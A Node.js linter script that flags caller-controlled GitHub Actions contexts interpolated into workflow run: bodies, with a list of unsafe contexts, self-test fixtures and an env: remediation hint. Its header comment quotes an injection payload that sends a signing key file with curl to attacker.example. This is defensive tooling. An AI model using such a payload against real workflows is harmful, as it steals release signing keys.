#!/usr/bin/env node
/**
 * Forbids interpolating attacker-influenced context into a workflow `run:` body.
 *
 * GitHub substitutes `${{ … }}` into the script text *before* bash parses it. A
 * workflow_dispatch input of `$(curl -d @$RUNNER_TEMP/key.pem https://attacker.example)`
 * therefore executes as a command. In build-and-release.yml that happened in the same step
 * that decodes RELEASE_SIGNING_PRIVATE_KEY to disk, so the injected shell ran beside the
 * release signing key (#539).
 *
 * The fix is always the same: pass the value through the step's `env:` and read it as a
 * shell variable, so it is data rather than script text.
 *
 * Only genuinely attacker-influenced contexts are policed. `steps.*.outputs.*`,
 * `needs.*.result`, `github.sha` and `github.repository` are not: they are produced by
 * GitHub or by earlier steps in this same workflow, and forbidding them would flag dozens
 * of benign lines and get the check disabled.
 *
 * Read-only. `--self-test` proves the detector fires.
 */

// The fixtures and the remediation hint below contain literal GitHub Actions `${{ … }}`
// syntax inside ordinary strings. no-template-curly-in-string reads that as a mistyped
// template literal; here it is the exact text this checker exists to reason about, and
// obscuring it with concatenation would make the fixtures unreadable.
/* eslint-disable no-template-curly-in-string */

import { readdirSync, readFileSync } from 'node:fs'
import path from 'node:path'
import process from 'node:process'
import { fileURLToPath } from 'node:url'

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..')
const WORKFLOWS = path.join(ROOT, '.github', 'workflows')

/** Contexts a caller can put arbitrary text into. */
const UNSAFE = [
  'github.event.inputs.',
  'inputs.',
  'github.event.issue.',
  'github.event.pull_request.title',
  'github.event.pull_request.body',
  'github.event.comment.',
  'github.head_ref',
]

export function findInjections(files, readFile, unsafe = UNSAFE) {
  const problems = []
  for (const file of files) {
    const text = readFile(file)
    if (!text)
      continue
    const lines = text.split('\n')
    let inRun = false
    let runIndent = 0
    lines.forEach((line, index) => {
      const stripped = line.trimStart()
      const indent = line.length - stripped.length
      if (/^-?\s*run:\s*[|>]/.test(stripped)) {
        inRun = true
        runIndent = indent
        return
      }
      if (inRun && stripped && indent <= runIndent)
        inRun = false
      if (!inRun || !line.includes('${{'))
        return
      // One finding per line. `github.event.inputs.x` matches both `github.event.inputs.`
      // and `inputs.`, and reporting it twice makes the count meaningless — which the
      // self-test caught before this shipped.
      const context = unsafe.find(candidate => line.includes(candidate))
      if (context)
        problems.push({ file, line: index + 1, context, text: stripped.slice(0, 90) })
    })
  }
  return problems
}

function listWorkflows() {
  return readdirSync(WORKFLOWS).filter(n => n.endsWith('.yml') || n.endsWith('.yaml')).sort()
}

function readWorkflow(file) {
  try {
    return readFileSync(path.join(WORKFLOWS, file), 'utf8')
  }
  catch {
    return null
  }
}

function selfTest() {
  const cases = [
    {
      name: 'a workflow_dispatch input inside run: is caught',
      text: '      run: |\n        X="${{ github.event.inputs.tag }}"\n',
      expect: 1,
    },
    {
      name: 'the same value in env: is allowed',
      text: '      env:\n        X: ${{ github.event.inputs.tag }}\n      run: |\n        echo "$X"\n',
      expect: 0,
    },
    {
      name: 'a step output inside run: is not policed',
      text: '      run: |\n        X="${{ steps.meta.outputs.version }}"\n',
      expect: 0,
    },
    {
      name: 'github.head_ref inside run: is caught',
      text: '      run: |\n        git checkout "${{ github.head_ref }}"\n',
      expect: 1,
    },
    {
      name: 'a run: block that ended does not leak into the next step',
      text: '      run: |\n        echo hi\n      - name: next\n        with:\n          x: ${{ github.event.inputs.tag }}\n',
      expect: 0,
    },
  ]

  let failures = 0
  for (const testCase of cases) {
    const found = findInjections(['fixture.yml'], () => testCase.text)
    const ok = found.length === testCase.expect
    console.log(`${ok ? 'ok  ' : 'FAIL'} ${testCase.name}`)
    if (!ok) {
      failures += 1
      console.log(`     expected ${testCase.expect}, got ${found.length}: ${JSON.stringify(found)}`)
    }
  }

  const real = findInjections(listWorkflows(), readWorkflow)
  console.log(`${real.length === 0 ? 'ok  ' : 'FAIL'} the real workflows are clean`)
  if (real.length > 0) {
    failures += 1
    for (const p of real) console.log(`     ${p.file}:${p.line} ${p.context}`)
  }
  return failures
}

function main() {
  if (process.argv.includes('--self-test'))
    process.exit(selfTest() > 0 ? 1 : 0)

  const files = listWorkflows()
  const problems = findInjections(files, readWorkflow)
  if (problems.length > 0) {
    console.error('[workflow-injection] caller-controlled context interpolated into a run: body:\n')
    for (const p of problems)
      console.error(`  - ${p.file}:${p.line}  ${p.context}\n      ${p.text}`)
    console.error(
      '\nGitHub substitutes ${{ }} into the script before bash parses it, so a value'
      + '\ncontaining $(…) executes. Pass it through the step\'s env: instead:\n'
      + '\n    env:\n      TAG: ${{ github.event.inputs.tag }}\n    run: |\n      echo "$TAG"',
    )
    process.exit(1)
  }

  console.log(
    `[workflow-injection] ${files.length} workflows: no caller-controlled context reaches a run: body`,
  )
}

// Guarded so findInjections can be imported without running the check.
if (process.argv[1] && path.resolve(process.argv[1]) === fileURLToPath(import.meta.url))
  main()
